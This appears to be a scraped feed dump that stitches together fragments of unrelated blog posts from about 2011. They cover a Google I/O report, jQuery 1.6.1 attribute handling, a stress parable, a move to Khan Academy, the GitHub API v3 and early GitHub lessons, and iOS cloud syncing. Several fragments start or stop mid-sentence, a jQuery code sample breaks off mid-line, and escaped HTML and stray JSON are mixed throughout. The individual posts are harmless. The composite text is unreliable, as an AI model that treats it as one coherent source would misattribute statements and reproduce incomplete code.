music by <a href=\"http://www.sexyvisuals.com/\">Sexyvisuals</a>, lots of drinks and a truckload of cool things to look at. Hardware hacks, futuristic vehicles and a photobooth all kept people busy.</p>\n\n\t<p>The band was Jane’s Addiction and I can safely say they were totally out of place. Perry Farrell proved once again to be a d*ck by abusing Google and the audience on stage. All in all they just did not fit. This is a geek event. Why not get a <a href=\"http://pornophonique.de/\">geek band</a>? This was money wasted.</p>\n\n\t<p>Overall the organisation was spot-on. You knew where to go, what is happening and there was not much congestion although the amount of attendees simply makes that happen. There was a glitch with my name tag showing me as a Google speaker and not external and thus not allowing me to get free stuff but it was remedied quickly enough.</p>\n\n\t<p><h2>Swag, swag and some more swag</h2></p>\n\n\t<p>Talking of free stuff – people attending IO left laden with goodies. Originally I had hoped for Google to hand out new phones (as my Nexus One suffers from the known <a href=\"http://www.androidguys.com/2010/09/08/manage-nexus-broken-power-button/\">Off Button Failure</a>) but going away with 3 T-Shirts, a mobile hotspot for the <span>US </span>(which saves me right now as the <span>GBP 7</span>.50 per MB of roaming is not fun), a Samsung Android tablet and the option to get my Chromebook as soon as they are out I really can’t complain. That doesn’t mean I didn’t hear people complaining! In addition to these “free for all” bits you also got extras for attending some special talks like an Experia phone at the gaming talk and a new Nexus S at the talk about Native Client. As I missed both this was not for me though. Drat.</p>\n\n\t<p><h2>A bumpy start</h2></p>\n\n\t<p>The conference started bad for me. I was asked to give a talk about <span>HTML5</span> video and captioning/subtitling and was very chuffed about speaking at the great big Google event. It was tough for me to say no to two other conferences that had me listed as a speaker, and I still feel sorry about breaking my promise there. The blow came then when I arrived – as my talk got cancelled. So I was just to sit back, relax and enjoy the show instead of being a actor or part of the chorus line.</p>\n\n\t<p><h2>The talks I attended</h2></p>\n\n\t<p>I spent most of my time in the Chrome channel, so here is what I’ve seen with a quick one-liner about it. Most of these will be available as videos and the slides should be out somewhere, too.</p>\n\n\t<p><ul><li><strong>WebGL Techniques and Performance</strong> – some great tips on making WebGL snappy – included fish, so it has to be native</li><li><strong>Chrome Web Store Publisher Forum</strong> – this sounded interesting but was not for me. If you want to publish something on the store and make money, there were some good tips though.</li><li><strong>Super Browser 2 Turbo <span>HD </span>Remix: Introduction to <span>HTML5 </span>Game Development</strong> – some great tips on how to build games.</li><li><strong><span>HTML5 </span>Today with Google Chrome Frame</strong> – a good introduction on how to rid the web of the scourge of old <span>IE </span>- now also available for people who are not admin on their windows machine.</li><strong>Web Fonts are changing the Web. Learn why.</strong> – showcase of Google web fonts and the tools to easily use them. Some cool new features there. I thought the demo of creating a logo with a font was pointless though – why would I ever have to highlight and paste a logo?<li><strong><a href=\"http://www.htmlfivewow.com/\"><span>HTML5 </span>Showcase for Web Developers: The Wow and the How</a></strong> – amazingly cool <span>HTML5</span> showcase demo! I loved how they built on some of the things in <a href=\"http://webowonder.org\">Web O’Wonder</a> and explained the File APIs instead of just going “oh look, 3D!”</li><li><strong>Mobile Web Development: From Zero to Hero</strong> – the <span>UK </span>Google boys showed some good tricks how to use <span>HTML5</span> on handhelds</li><li><strong><span>HTML5</span> &amp; What’s Next </strong> – a glimpse into the next steps of making the browser a real app platform. Surprisingly a lot of <span>CSS</span> talk there (mixins, variables…) but also some very cool client side <span>MVC</span> ideas</li><li><strong>Creating Accessible Interactive Web Apps using <span>HTML5</span></strong> – well intentioned talk with great presentation but awful content. I will write a lot more about this one soon.</li><li><strong>Ignite I/O</strong> – always a great format and very cool talks this time.</li></ul></p>\n\n\t<p><h2>Announcements I enjoyed</h2></p>\n\n\t<p>Over all IO had some amazingly cool announcements. Many got the Americans excited (movie streaming on Android and Google Music) but failed to make me happy as they are only available here. Others, however, got me very happy:</p>\n\n\t<p><ul><li><strong>Chrome store going international</strong> has been a promise that took far too long to fulfil</li><li><strong>Google entering the open hardware arena</strong> with an own Arduino project that works with Android. Some very cool demos were shown about that and it is great for hackdays.</li><li><strong>Android getting spatial detection for cameras</strong> to allow for real 3D interfaces using the user’s field of vision</li><li><strong>Chrome frame for non-admin users</strong> means a lot more people can say good-bye to <span>IE6</span></li><li><strong>Google fonts <span>API</span> getting extended</strong> to allow for faster web fonts</li><li><strong>The new interactive WebGL song/movie <a href=\"http://ro.me\">3 Dreams of Black</a></strong> pushing the envelope much cleaner and further than Wilderness Downtown (strange though that it is http://ro.me and not http://ch.ro.me)</li><li><strong><a href=\"http://chrome.angrybirds.com/\">Angry Birds for the web</a></strong> – I am so tempted to write a trainer menu now :)</li><li><strong><a href=\"http://www.google.com/chromebook/#\">Chromebooks</a> coming out</strong> which are the grown up version of the <span>CR48</span> pilot. I am not that excited for mom and dad end users but I see them as a great opportunity to get rid of old and outdated infrastructures in companies. Of course we need to get Office onto them somehow.</li><li><strong>A lot of cool file <span>API</span> and sound APIs for Chrome</strong> which hopefully should be coming in other browsers, too.</li><li><strong>Chromebooks coming with a built-in screen reader</strong> – you hear that Microsoft? Go ship <span>NVDA</span> with Windows!</li></ul></p>\n\n\t<p><h2>Things I want to happen now</h2></p>\n\n\t<p>Well, for starters I can’t wait to get my hands on the Chrome book. I will also hunt down the <span>HTML5</span> demos shown to get them fixed for other browsers and added to <a href=\"http://demos.mozilla.org\">Mozilla Demo Lab</a> and I will have a few talks with YouTube about captioning videos. And of course to have a good follow-up with all the people I met.</p>\n\n <p><iframe src=\"http://feedads.g.doubleclick.net/~ah/f/05g37okck9ig2gsd876j5of8bk/300/250?ca=1&amp;fh=280#http%3A%2F%2Fwww.wait-till-i.com%2F2011%2F05%2F13%2Fgoogle-io-2011-impressions-and-reflections%2F\" width=\"100%\" height=\"280\" frameborder=\"0\" scrolling=\"no\" marginwidth=\"0\" marginheight=\"0\"></iframe></p><img src=\"http://feeds.feedburner.com/~r/chrisheilmann/~4/4jlOvxzFaqk\" height=\"1\" width=\"1\">"

Congrats to the team and everyone that was involved with the release!</p>\n<p>A relatively controversial change in 1.6 was regarding how attributes and DOM object properties were handled. In 1.6 we wanted to take the major step of completely separating the two, allowing us to create an <code>.attr()</code> method that wasn’t quite so mealy-mouthed with regards to how attributes were handled. We did this in 1.6 because we felt that it was a substantial change (we only do major changes in the 1.x major releases of jQuery) and had the possibility of affecting people.</p>\n<p>We did a considerable amount of testing on the code and we were quite confident that the amount of problems that people would encounter, while upgrading, would be quite minimal. The biggest pain points, we surmised, would be regarding how boolean attributes were handled (attributes like “disabled” or “selected”). However most of this would be mitigated and would likely have worked fine for users that consistently used <code>.attr()</code> to access and update their attributes.</p>\n<p>After making the changes, and publishing 1.6, there were enough complaints that we had changed the API to cause us to reconsider and return <code>.attr()</code> to its sometimes-attribute, sometimes-property, state.</p>\n<p>jQuery is in an incredibly tricky position now (and has been for some time). We very rarely add features to the library, for fear of bloat and added API maintenance overhead, and are rarely able to make any sort of API change, for fear of preventing people from upgrading.</p>\n<p>Thankfully even though we’ve reverted some of the changes in 1.6, we’ve done it in a way that still maintains the performance gains that we achieved with the 1.6 release.</p>\n<p>I wanted to try and <a href=\"https://github.com/jquery/jquery/blob/master/src/attributes.js#L293\">summarize the <code>.attr()</code> method</a>, to explain how it currently works in 1.6.1, but ended up writing up a sample function instead (note that this is a bit of an over-simplification, please <a href=\"https://github.com/jquery/jquery/blob/master/src/attributes.js#L293\">read the code</a> for more details):</p>\n<div>\t<div><ol style=\"font-family:monospace\"><li style=\"font-weight:normal;vertical-align:top\"><div style=\"font:normal normal 1em/1.2em monospace;margin:0;padding:0;background:none;vertical-align:top\">function attr( elem, name, value ) {</div></li>\n<li style=\"font-weight:normal;vertical-align:top\"><div style=\"font:normal normal 1em/1.2em monospace;margin:0;padding:0;background:none;vertical-align:top\">    // Are we setting a value?</div></li>\n<li style=\"font-weight:normal;vertical-align:top\"><div style=\"font:normal normal 1em/1.2em monospace;margin:0;padding:0;background:none;vertical-align:top\">    if ( value !== undefined ) {</div></li>\n<li style=\"font-weight:normal;vertical-align:top\"><div style=\"font:normal normal 1em/1.2em monospace;margin:0;padding:0;background:none;vertical-align:top\">        // Make sure the element has the ability to set an attribute</div></li>\n<li style=\"font-weight:normal;vertical-align:top\"><div style=\"font:normal normal 1em/1.2em monospace;margin:0;padding:0;background:none;vertical-align:top\">        if ( typeof elem.setAttribute !== &quot;undefined&quot;

Even when we make, relatively minor, API changes like in the 1.6 release the amount of negative feedback that we get is monumental. If we’ve learned anything after doing <a href=\"http://docs.jquery.com/Downloading_jQuery\">31 releases</a> of jQuery it’s that people like having stability in their API and will cherish that over everything else.</p>\n<p>I do want to thank the community though for being so vocal and working to communicate with the team so actively. Without the community’s communication and support it’s doubtful that the team would be able to continue operating.</p>\n<p>I would like to take this opportunity to encourage everyone to <a href=\"http://docs.jquery.com/Getting_Involved\">get involved</a> with the development of jQuery. We hold active discussions every day in IRC and hold public meetings once a week. We also post <a href=\"http://jquery.org/updates/category/core/\">weekly status updates</a> if you wish to follow along. Right now we’re working on the 1.7 release of the library and are actively encouraging contributions and feedback. If you want to help ensure the quality and stability of the next release of jQuery, the best way to do so is to get involved. Hope to see you around the bug tracker.</p>\n<img src=\"http://feeds.feedburner.com/~r/JohnResig/~4/9ATQ-8y6Lyo\" height=\"1\" width=\"1\">"

Here it is for you to also enjoy:</p>\n<blockquote><p>A young lady confidently walked around the room while leading and explaining stress management to an audience; with a raised glass of water, and everyone knew she was going to ask the ultimate question, ‘half empty or half full?’….. she fooled them all… “How heavy is this glass of water?”, she inquired with a smile.</p>\n<p>Answers called out ranged from 8 oz. to 20 oz.</p>\n<p>She replied, “The absolute weight doesn’t matter. It depends on how long I hold it. If I hold it for a minute, that’s not a problem. If I hold it for an hour, I’ll have an ache in my right arm. If I hold it for a day, you’ll have to call an ambulance.  In each case it’s the same weight, but the longer I hold it, the heavier it becomes.” She continued, “and that’s the way it is with stress. If we carry our burdens all the time, sooner or later, as the burden becomes increasingly heavy, we won’t be able to carry on.”</p>\n<p>“As with the glass of water, you have to put it down for a while and rest before holding it again.  When we’re refreshed, we can carry on with the burden – holding stress longer and better each time practiced. So, as early in the evening as you can, put all your burdens down. Don’t carry them through the evening and into the night… pick them up tomorrow.</p>\n<p>Whatever burdens you’re carrying now, let them down for a moment. Relax, pick them up later after you’ve rested. Life is short. Enjoy it and the now ’supposed’ stress that you’ve conquered!”</p></blockquote>\n\n\n<p><strong>Related posts:</strong><ol><li><a href=\"http://www.confidentfuture.com.au/blog/ever-experienced-true-motivation/\" rel=\"bookmark\" title=\"Permanent Link: Ever Experienced True Motivation?\">Ever Experienced True Motivation?</a> <small>Have you ever experienced true motivation?

During my time at the company I had an amazing opportunity to promote JavaScript. It’s been an incredible experience working with everyone at Mozilla. The company is easily one of the most developer-friendly organizations I can imagine, with some of the smartest coders in the world. Mozilla is <a href=\"http://www.mozilla.com/en-US/careers/\">hiring across the board</a> – I strongly encourage you to apply if you’re looking for one of the best jobs you’ve ever had.</p>\n<p>I had the opportunity to promote JavaScript as a JavaScript Evangelist (and build tools like <a href=\"https://wiki.mozilla.org/FUEL\">FUEL</a>, <a href=\"http://dromaeo.com/\">Dromaeo</a>, and <a href=\"http://processingjs.org/\">Processing.js</a>) and work as a JavaScript Tool Developer (building tools like <a href=\"http://swarm.jquery.org/\">TestSwarm</a>, <a href=\"http://fireunit.org/\">FireUnit</a>, and improving <a href=\"http://docs.jquery.com/Qunit\">QUnit</a>).</p>\n<p>Over the past year and a half Mozilla gave me the ability to work on jQuery full-time. This has resulted in 9 releases of jQuery (including today’s release of <a href=\"http://blog.jquery.com/2011/05/03/jquery-16-released/\">jQuery 1.6</a>) and a drastically improved jQuery organization (we’re now under the <a href=\"http://sfconservancy.org/\">Software Freedom Conservancy</a> non-profit, hold frequent team meetings, <a href=\"http://groups.google.com/group/jquery-team-public\">public votes</a>, provide <a href=\"http://jquery.org/updates/\">public status updates</a>, and <a href=\"http://docs.jquery.com/Getting_Involved\">actively encourage participation</a>). Thankfully the jQuery project is running quite smoothly these days, allowing me to scale back my involvement to a more-reasonable amount of time and take on other development work.</p>\n<p><img src=\"http://www.khanacademy.org/images/khan-logo-vertical-transparent.png\" style=\"float:right;margin:0 0 10px 10px\"></p>\n<p>Lately I’ve been looking for a chance to get back into active application development again. I’ve been working on a few applications in my spare time (mostly mobile-centric applications, using jQuery Mobile) and an excellent opportunity has arrived.</p>\n<p>Starting next Monday I will be working at <a href=\"http://www.khanacademy.org/\">Khan Academy</a> full-time leading their Open Source efforts and JavaScript development. If you aren’t familiar with Khan Academy I highly recommend watching <a href=\"http://www.ted.com/talks/salman_khan_let_s_use_video_to_reinvent_education.html\">the excellent talk at Ted</a> given by Sal Khan himself. In short: Khan Academy is attempting to revolutionize how students learn and how teachers are able to help students.</p>\n<p>Learning, and teaching others, has been a life-long passion for me. I see Khan Academy as a fantastic realm in which I can help to promote education and work to design better tools for teaching and getting people involved with Open Source. More than anything else I want to increase the size and activity of the community around Khan Academy. This includes everything from getting more casual contributors (such as those writing problems sets) to getting more code and debugging contributions.</p>\n<p>When I start I’m going to be working on rewriting the framework for creating problem sets, constructing the initial version of the iPad application, and working to improve Khan Academy’s Open Source efforts.</p>\n<p>It’s incredibly important to me that Khan Academy is a non-profit and is working to ensure that all generated material (videos, exercises, and even the application itself) will be released for free and in the open. I’m going to be working to ensure that this continues into the future with help from contributors in the community.</p>\n<p>Khan Academy is very excited to have me continue working on jQuery during my day-to-day along with continuing to speak at conferences. Additionally I will be continuing to live in Boston for the foreseeable future.</p>\n<blockquote><p>I should note that I’ve made a personal decision to scale back some other aspects of my professional life. I’m no longer accepting any new speaking engagements. For the rest of this year I will only be speaking at Velocity in June, the jQuery Conference in October, and Fronteers in October.</p>\n<p>Additionally a new co-author, Bear Bibeault, has been brought on to help with the completion of my book: <a href=\"http://jsninja.com/\">Secrets of the JavaScript Ninja</a>. With his help the book should be finalized this year.</p></blockquote>\n<p>I’m terribly excited about this new opportunity and can hardly wait to begin. Thank you to Mozilla for the opportunity these past few years and thank you to Khan Academy for accepting me aboard. Here’s to a wonderful 2011!</p>\n<img src=\"http://feeds.feedburner.com/~r/JohnResig/~4/LBEl2mu59E0\" height=\"1\" width=\"1\">"

He offers cheap solutions and lessons on how to get good lighting from portables flashes, cereal boxes, and ball bungees. He believes lighting is about “what you do with it, not what you spend on it.” It’s working too: He sold $1 million in tickets on a recent tour, hundreds of thousands read his posts each month, and manufacturers have even named lines of equipment after him.

API v3 also has a full <a href=\"http://developer.github.com/v3/gists\">Gist</a> support.  It's <em>bonus</em>.</p>\n\n<p><strong>Update:</strong>  We've already started making a few tweaks based on feedback.  Any breaking changes during the API v3 beta phase will be noted here: <a href=\"http://developer.github.com/.\">http://developer.github.com/.</a></p>\n\n<p>API v3 also marks a new direction for future API calls:</p>\n\n<h3>REST Conventions</h3>\n\n<p>We took this chance to look hard at how the API was structured, and made a few tweaks:</p>\n\n<ul>\n<li>URLs are simpler and more consistent:  <code>https://api.github.com/repos/github/gollum/issues.json</code>.</li>\n<li>Resources return <code>url</code> fields so that clients don't have to build URLs.</li>\n<li>Create/Update actions take JSON, instead of POST parameters.</li>\n<li>Pagination and Rate Limiting info is returned on every applicable request.</li>\n<li>JSON-P requests get a special payload with header information.</li>\n</ul><h3>JSON Everywhere</h3>\n\n<p>We've only implemented JSON as the request and response format for the API.  JSON is incredibly easy to parse, and maps well to programming languages.  It's also much more compact than XML.</p>\n\n<h3>Rate Limiting</h3>\n\n<p>We're trying out a new Rate Limiting system.  Instead of punishing scripts that flood the API in a short time, we're setting daily caps to 5000 requests.  This is well above what most of our current white listed users use.</p>\n\n<h3>What about API v2?</h3>\n\n<p>Don't worry, API v2 isn't going anywhere for a while.  As pieces of the API get ported to v3, we'll be working with the communities around the GitHub libraries to make sure they support the new endpoints.  We'll be announcing deprecation plans on the <a href=\"http://support.github.com/discussions/api\">API support forum</a>.</p>"

It has stayed in my drafts folder since then, waiting for the last 2% to be written. Why I never published it is beyond my reckoning, but it serves as a great reminder of how I perceived the world back then. In the time since I wrote this we’ve grown from four people to twenty-six, settled into an office, installed a kegerator, and still never taken outside funding. In some ways, things have changed a great deal, but in the most important ways, things are still exactly the same. Realizing this puts a big smile on my face.</b></p>\n<p>The end of the year is a great time to sit down with a glass of your favorite beverage, dim the lights, snuggle up next to the fire and think about what you’ve learned over the past twelve months.</p>\n<p>For me, 2008 was the year that I helped design, develop, and launch GitHub. Creating a new startup is an intense learning experience. Through screwups and triumphs, I have learned some valuable lessons this year. Here’s a few of them.</p>\n<h2>Start Early</h2>\n<p>When Chris and I started working on GitHub in late 2007, Git was largely unknown as a version control system. Sure, Linux kernel hackers had been using it since day one, but outside of that small microcosm, it was rare to come across a developer that was using it on a day-to-day basis. I was first introduced to Git by Dave Fayram, a good friend and former coworker during my days at Powerset. Dave is the quintessential early adopter and, as far as I can calculate, patient zero for the spread of Git adoption in the Ruby community and beyond.</p>\n<p>Back then, the Git landscape was pretty barren. Git had only recently become  usable by normal people with the 1.5 release. As for Git hosting, there was really only <a href=\"http://repo.or.cz/\">repo.or.cz</a>, which felt to me very limited, clumsy, and poorly designed. There were no commercial Git hosting options whatsoever. Despite this, people were starting to talk about Git at the Ruby meetups. About how awesome it was. But something was amiss. Git was supposed to be this amazing way to work on code in a distributed way, but what was the mechanism to securely share private code? Your only option was to setup user accounts on Unix machines and use that as an ad-hoc solution. Not ideal.</p>\n<p>And so GitHub was born. But it was born into a world where there was no existing market for paid Git hosting. We would be <em>creating</em> the market. I vividly remember telling people, “I don’t expect GitHub to succeed right away. Git adoption will take a while, but we’ll be ready when it happens.” Neither Chris nor I were in any particular hurry for this to happen. I was working full time at Powerset, and he was making good money as a Rails consultant. By choosing to build early on top of a nascent technology, we were able to construct a startup with basically no overhead, no competition, and in our free time.</p>\n<h2>Adapt to Your Customers</h2>\n<p>Here’s a seemingly paradoxical piece of advice for you: Listen to your customers, but don’t let them tell you what to do. Let me explain. Consider a feature request such as “GitHub should let me <span>FTP</span> up a documentation site for my project.” What this customer is really trying to say is “I want a simple way to publish content related to my project,” but they’re used to what’s already out there, and so they pose the request in terms that are familiar to them. We could have implemented some horrible <span>FTP</span> based solution as requested, but we looked deeper into the underlying question and now we allow you to publish content by simply pushing a Git repository to your account. This meets requirements of both functionality <em>and</em> elegance.</p>\n<p>Another company that understands this concept at a fundamental level is Apple. I’m sure plenty of people asked Apple to make a phone but Steve Jobs and his posse looked beneath the request and figured out what people really wanted: a nice looking, simple to use, and easy to sync mobile device that kicked some serious ass. And that’s the secret. Don’t give your customers what they ask for; give them what they <em>want</em>.</p>\n<h2>Have Fun</h2>\n<p>I went to college at a little school in California called Harvey Mudd. Yeah, I know you haven’t heard of it, but if you remember those US News &amp; World Report “Best Colleges” books that you obsessed over in highschool (ok, maybe you didn’t, but I did), Harvey Mudd was generally ranked as the engineering school with the greatest number of hours of homework per night. Yes, more than <span>MIT</span>, and yes, more than Caltech. It turned out to be true, as far as I can tell. I have fond memories of freaking out about ridiculously complex spring/mass/damper systems and figuring the magnetic flux of a wire wrapped around a cylinder in a double helix. We studied hard—very hard. But we played hard too. It was the only thing that could possibly keep us sane.</p>\n<p>Working on a startup is like that. It feels a bit like college. You’re working on insanely hard projects, but you’re doing it with your best friends in the world and you’re having a great time (usually). In both environments, you have to goof off a lot in order to balance things out. Burnout is a real and dangerous phenomenon. Fostering a playful and creative environment is critical to maintaining both your personal health, and the health (and idea output) of the company.</p>\n<h2>Pay attention to Twitter</h2>\n<p>I’ve found Twitter to be an extremely valuable resource for instant feedback. If the site is slow for some reason, Twitter will tell me so. If the site is unreachable for people in a certain country (I’m looking at you China), I’ll find out via Twitter. If that new feature we just released is really awesome, I’ll get a nice ego boost by scanning the Twitter search.</p>\n<p>People have a tendency to turn to Twitter to bitch about all the little bugs they see on your website, usually appended with the very tiresome “<span>FAIL</span>”. These are irksome to read, but added together are worth noticing. Often times these innocent tweets will inform a decision about whether an esoteric bug is worth adding to the short list. We also created a GitHub account on Twitter that our support guy uses to respond to negative tweets. Offering this level of customer service almost always turns a disgruntled customer into a happy one.</p>\n<p>If you have an iPhone, I heartily recommend the <a href=\"http://fanzter.com/products/download/summizer\">Summizer</a> app from Fanzter, Inc. It makes searching, viewing, and responding to tweets a cinch.</p>\n<h2>Deploy at Will!</h2>\n<p>At the first RailsConf I had the pleasure of hearing Martin Fowler deliver an amazing keynote. He made some apt metaphors regarding agile development that I will now paraphrase and mangle.</p>\n<p>Imagine you’re tasked with building a computer controlled gun that can accurately hit a target about 50 meters distant. That is the only requirement. One way to do this is to build a complex machine that measures every possible variable (wind, elevation, temperature, etc.) before the shot and then takes aim and shoots. Another approach is to build a simple machine that fires rapidly and can detect where each shot hits. It then uses this information to adjust the aim of the next shot, quickly homing in on the target a little at a time.</p>\n<p>The difference between these two approaches is to realize that bullets are cheap. By the time the former group has perfected their wind detection instrument, you’ll have finished your simple weapon and already hit the target.</p>\n<p>In the world of web development, the target is your ideal offering, the bullets are your site deploys, and your customers provide the feedback mechanism. The first year of a web offering is a magical one. Your customers are most likely early adopters and love to see new features roll out every few weeks. If this results in a little bit of downtime, they’ll easily forgive you, as long as those features are sweet. In the early days of GitHub, we’d deploy up to ten times in one afternoon, always inching closer to that target.</p>\n<p>Make good use of that first year, because once the big important customers start rolling in, you have to be a lot more careful about hitting one of them with a stray bullet. Later in the game, downtime and botched deploys are money lost and you have to rely more on building instruments to predict where you should aim.</p>\n<h2>You Don’t Need an Office</h2>\n<p>All four fulltime GitHub employees work in the San Francisco area, and yet we have no office. But we’re not totally virtual either. In fact, a couple times a week you’ll find us at a cafe in North Beach, huddled around a square table that was made by nailing 2×4s to an ancient fold-out bulletin board. It’s no Google campus, but the rent is a hell of a lot cheaper and the drinks are just as good!</p>\n<p>This is not to say that we haven’t looked at a few places to call home. Hell, we almost leased an old bar. But in the end there’s no hurry to settle down. We’re going to wait until we find the perfect office. Until then, we can invest the savings back into the company, or into our pockets. For now, I like my couch and the cafe just fine.</p>\n<p>Of course, none of this would be possible without 37signals’ <a href=\"http://www.campfirenow.com/\">Campfire</a> web-based chat and the very-difficult-to-find-but-totally-amazing <a href=\"http://productblog.37signals.com/products/2008/10/propane-takes-c.html\">Propane</a> <span>OSX</span> desktop app container that doubles the awesome. Both highly recommended.</p>\n<h2>Hire Through Open Source</h2>\n<p>Beyond the three cofounders of GitHub, we’ve hired one full time developer (Scott Chacon) and one part time support specialist (Tekkub).</p>\n<p>We hired Tekkub because he was one of the earliest GitHub users and actively maintains more than 75 projects (WoW addons mostly) on GitHub and was very active in sending us feedback in the early days. He would even help people out in the <span>IRC</span> channel, simply because he enjoyed doing so.</p>\n<p>I met Scott at one of the San Francisco Ruby meetups where he was presenting on one of his myriad Git-centric projects. Scott had been working with Git long before anyone else in the room. He was also working on a pure Ruby implementation of Git at the same time I was working on my fork/exec based Git bindings. It was clear to me then that depending on how things went down, he could become either a powerful ally or a dangerous foe. Luckily, we all went drinking afterwards and we became friends. Not long after, Scott started consulting for us and wrote the entire backend for what you now know of as <a href=\"http://gist.github.com/\">Gist</a>. We knew then that we would do whatever it took to hire Scott full time. There would be no need for an interview or references. We already knew everything we needed to know in order to make him an offer without the slightest reservation.</p>\n<p>The lesson here is that it’s far easier and less risky to hire based on relevant past performance than it is to hire based on projected future performance. There’s a corollary that also comes into play: if you’re looking to work for a startup (or anyone for that matter), contribute to the community that surrounds it. Use your time and your code to prove that you’re the best one for the job.</p>\n<h2>Trust your Team</h2>\n<p>There’s nothing I hate more than micromanagers. When I was doing graphic design consulting 5 years ago I had a client that was very near the Platonic form of a micromanager. He insisted that I travel to his office where I would sit in the back room at an old Mac and design labels and catalogs and touch up photographs of swimwear models (that part was not so bad!). While I did these tasks he would hover over me and bark instructions. “Too red! Can you make that text smaller? Get rid of those blemishes right there!” It drove me absolutely batty.</p>\n<p>This client could have just as easily given me the task at the beginning of the day, gone and run the business, and come back in 6 hours whereupon I would have created better designs twice as fast as if he were treating me like a robot that converted his speech into Photoshop manipulations. By treating me this way, he was marginalizing my design skills and wasting both money and talent.</p>\n<p>Micromanagement is symptomatic of a lack of trust. The remedy for this ailment is to hire experts and then trust their judgment. In a startup, you can drastically reduce momentum by applying micromanagement, or you can boost momentum by giving trust. It’s pretty amazing what can happen when a group of talented people who trust each other get together and decide to make something awesome.</p>\n<h2>You Don’t Need Venture Capital</h2>\n<p>A lot has been written recently about how the venture capital world is changing. I don’t pretend to be an expert on the subject, but I’ve learned enough to say that a web startup like ours doesn’t need any outside money to succeed. I know this because we haven’t taken a single dime from investors. We bootstrapped the company on a few thousand dollars and became profitable the day we opened to the public and started charging for subscriptions.</p>\n<p>In the end, every startup is different, and the only person that can decide if outside money makes sense is you. There are a million things that could drive you to seek and accept investment, but you should make sure that doing so is in your best interest, because it’s quite possible that you don’t <em>need</em> to do so. One of the reasons I left my last job was so that I could say “the buck stops here.” If we’d taken money, I would no longer be able to say that.</p>\n<h2>Open Source Whatever You Can</h2>\n<p>In order for GitHub to talk to Git repositories, I created the first ever Ruby Git bindings. Eventually, this library become quite complete and we were faced with a choice: Do we open source it or keep it to ourselves? Both approaches have benefits and drawbacks. Keeping it private means that the hurdle for competing Ruby-based Git hosting sites would be higher, giving us an advantage. But open sourcing it would mean that</p>\n<p><b><span>NOTE</span>: This is where the post ended and remained frozen in carbonite until today. I intend to write a follow up post on our open source philosophy at GitHub in the near future. I’m sure the suspense is killing you!</b></p>\n<p><a href=\"http://news.ycombinator.com/item?id=2384320\">Discuss this post on Hacker News</a></p>"

      "content" : "<h2>A Cursory High-Level Overview of the Current Status of Cloud-Based Syncing and iOS Devices</h2>\n\n<p>After Apple’s iPad 2 introduction event last month, I ran into <a href=\"http://www.joshuatopolsky.com/\">Josh Topolsky</a>, and, of course, we talked about what we thought of it. Topolsky made an interesting observation: that the iPad 2 epitomized how Apple seems to be a generation ahead of its competitors on the device side — both hardware and software — but a generation <em>behind</em> on the cloud side.</p>\n\n<p>I’ve been thinking about the iPad in this context ever since, and I think it’s a perfect synopsis of the state of iOS. There will be no tablet this year from any competitor that matches the iPad 2 in terms of elegance, battery life, or build quality. No competing OS will match iOS in terms of on-the-device user experience.</p>\n\n<p>But most iPad competitors have little-to-no reliance on a connection to a desktop PC, the way an iPad does. Even RIM’s PlayBook is, in some sense, ahead in this regard. The PlayBook, as it is going to ship, is not a standalone device. <a href=\"http://www.wired.com/gadgetlab/2011/03/doa-rim-will-ship-playbook-without-mail-messaging-or-contacts/\">It requires a tethered BlackBerry phone</a> in order to do email, contacts, calendaring, or messaging — but it doesn’t require a PC. </p>\n\n<p>Michael Gartenberg has a good line: “<a href=\"http://www.macworld.com/article/159077/2011/04/gartenberg.html\">‘Post-PC’ does not mean ‘Sans-PC’</a>” — to wit, that just because the iPad requires a tethered PC doesn’t mean Apple is wrong that the iPad is a “post-PC” device.</p>\n\n<p>People arguing the other way aren’t hard to find. C.K. Sample: “<a href=\"http://www.sampletheweb.com/2011/03/04/dear-apple-youre-not-post-pc-until-you-cut-the-cord/\">Dear Apple: You’re Not ‘Post-PC’ Until You Cut the Cord</a>”. Paul Hontz: “<a href=\"http://thestartupfoundry.com/2011/03/05/if-ipads-are-%E2%80%9Cpost-pc-devices%E2%80%9D-why-must-i-sync-with-itunes-before-i-can-use-one/\">If iPads Are ‘Post-PC Devices’ Why Must I Sync With iTunes Before I Can Use One?</a>”.</p>\n\n<p>Fair question. Chad Olson, following up on Gartenberg’s piece for Macworld, <a href=\"http://thisischadolson.wordpress.com/2011/04/07/the-cable/\">proffers an answer</a>:</p>\n\n<blockquote>\n  <p>For the sake of argument, let’s assume that Apple is working on a\nway for the iPad to exist on its own. To “cut the cord” so\nto speak. (And to clarify, every time I say “iPad” I mean to\nsay “any iOS device”)</p>\n\n<p>In order for Apple to do this they would have to have an answer\nfor three key iTunes functions:</p>\n\n<ul>\n<li>getting your stuff onto your new iPad</li>\n<li>updating iOS</li>\n<li>backing up and restoring your iPad</li>\n</ul>\n</blockquote>\n\n<p>To Olson’s list I’d add one more: device activation. Those are the four reasons iPhones, iPads, and iPod Touches require you to sync with a Mac or PC running iTunes.</p>\n\n<p>I think it’s worth considering these as discrete problems, rather than thinking about this as a single “<em>Apple should eliminate the dependency on tethered syncing to desktop iTunes</em>” issue.</p>\n\n<p>Apple TV 2 shows the way forward. It’s an iOS device that works independently. Take it out of the box, plug it in, turn it on, enter your iTunes Store credentials — done. But Apple TV 2 doesn’t store content; it only does streaming. And because it only does streaming, there’s no initial sync for music or video, and there’s no need for anything to be backed up. If your Apple TV goes belly-up, you don’t lose any data.</p>\n\n<p>So of the four reasons why other iOS devices require tethering to iTunes running on a Mac or Windows PC, Apple TV only tackles — and admittedly only needs to tackle — two of them: device activation and software updates.</p>\n\n<p>I suspect those are the first two desktop iTunes dependencies that Apple will eliminate for iPhones and iPads. If Apple TV can activate itself and update its own software, there’s no reason iPhones and iPads couldn’t do the same. I’m not saying it’s an easy technical problem to solve — see, for example, <a href=\"http://blog.seattlepi.com/microsoft/2011/03/24/microsofts-windows-phone-7-update-process-in-one-word-fail/\">the problems Microsoft has had with updates to Windows Phone 7 devices</a> — but clearly, it’s technically feasible.</p>\n\n<p>One obvious problem: what to do if there isn’t enough free storage space on the device? Perhaps, in that case, the updater would suggest either freeing up some space or plugging the device into iTunes on a Mac or PC to update the software the old-fashioned way. A less obvious problem: even if/when over-the-air software updates are enabled for iPhones and iPads, should Apple still present tethered-to-a-computer updating as the <em>preferred</em> update mechanism? The reason: iTunes backs up the device before installing the update. An iPad that’s never been synced to a computer is an iPad that’s never been backed up.</p>\n\n<p>That’s important, because I don’t think over-the-air backups or media syncing are coming soon. Wireless networking just isn’t fast enough. I’m not talking about Wi-Fi syncing over a local network to iTunes running on your Mac or PC — <a 